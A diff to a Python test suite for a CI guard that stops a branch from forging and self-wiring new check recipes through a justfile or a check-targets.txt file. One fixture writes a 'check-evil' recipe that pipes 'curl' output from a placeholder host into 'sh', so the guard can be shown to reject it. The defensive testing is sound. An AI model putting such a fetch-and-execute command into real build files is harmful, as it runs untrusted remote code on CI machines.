@@ -263,7 +263,17 @@ def _write_wired_targets(*, root: Path, slugs: tuple[str, ...]) -> None:
     naming an arbitrary `check-<anything>` is not mistaken for reconciler output.
     """
     body = "\n".join(f"        {slug}" for slug in slugs)
-    (root / "justfile").write_text(f"check:\n    targets=(\n{body}\n    )\n", encoding="utf-8")
+    # Each slug also needs the recipe the producer's justfile writer appends,
+    # verbatim -- the guard pins that body so a forged slug cannot carry a
+    # branch-supplied payload.
+    recipes = "".join(
+        f"\n{slug}:\n    uv run python -m livespec_dev_tooling.checks."
+        f"{slug.removeprefix('check-').replace('-', '_')}\n"
+        for slug in slugs
+    )
+    (root / "justfile").write_text(
+        f"check:\n    targets=(\n{body}\n    )\n{recipes}", encoding="utf-8"
+    )
 
 
 def _repo_with_batched_aggregate(*, root: Path) -> Path:
@@ -506,6 +516,66 @@ def test_workflow_check_blocks_promoting_an_unrelated_matrix_block(*, tmp_path: 
         encoding="utf-8",
     )
     _git(cwd=tmp_path, args=["add", ".github/workflows/ci.yml"])
+
+    result = _run_workflow_check(cwd=tmp_path)
+
+    assert result.returncode == 1, result.stderr
+    assert "tracked exemption declaration" in result.stderr
+
+
+def test_workflow_check_blocks_a_slug_the_branch_wired_to_itself(*, tmp_path: Path) -> None:
+    """BEING WIRED IS NOT PROVENANCE EITHER, and this is the second time that bit.
+
+    Requiring an adopted slug to appear in `targets=(...)` closed the
+    arbitrary-slug hole only if the branch cannot ALSO write that array. It can:
+    a branch may invent a slug, add it to the array, and wire the matching CI
+    line in the SAME diff, so the wired test validates itself. Verified against
+    an earlier draft; both the justfile-array and the create-a-check-targets.txt
+    routes were accepted.
+
+    The guard therefore also pins the RECIPE BODY to the one the producer's
+    justfile writer appends. That removes the payload rather than the shape: a
+    forged slug must invoke a `livespec_dev_tooling.checks.<module>` that does
+    not exist, which runs no branch-supplied code and reds CI.
+    """
+    workflow = _repo_with_batched_aggregate(root=tmp_path)
+    justfile = tmp_path / "justfile"
+    justfile.write_text(
+        justfile.read_text(encoding="utf-8").replace(
+            "        check-aggregate-completeness\n",
+            "        check-aggregate-completeness\n        check-evil\n",
+        )
+        + "\ncheck-evil:\n    curl -s https://example.invalid | sh\n",
+        encoding="utf-8",
+    )
+    workflow.write_text(
+        workflow.read_text(encoding="utf-8")
+        + '          just check-evil || failed="$failed check-evil"\n',
+        encoding="utf-8",
+    )
+    _git(cwd=tmp_path, args=["add", "-A"])
+
+    result = _run_workflow_check(cwd=tmp_path)
+
+    assert result.returncode == 1, result.stderr
+    assert "tracked exemption declaration" in result.stderr
+
+
+def test_workflow_check_blocks_a_slug_wired_via_a_new_inventory_file(*, tmp_path: Path) -> None:
+    """The same forgery through `check-targets.txt`, which takes PRECEDENCE.
+
+    `_wired_targets` prefers a committed `check-targets.txt` over the justfile
+    array, so creating that file from scratch is a cheaper route to the same
+    self-authorisation -- and it bypasses the array entirely.
+    """
+    workflow = _repo_with_batched_aggregate(root=tmp_path)
+    (tmp_path / "check-targets.txt").write_text("check-evil\n", encoding="utf-8")
+    workflow.write_text(
+        workflow.read_text(encoding="utf-8")
+        + '          just check-evil || failed="$failed check-evil"\n',
+        encoding="utf-8",
+    )
+    _git(cwd=tmp_path, args=["add", "-A"])
 
     result = _run_workflow_check(cwd=tmp_path)
 
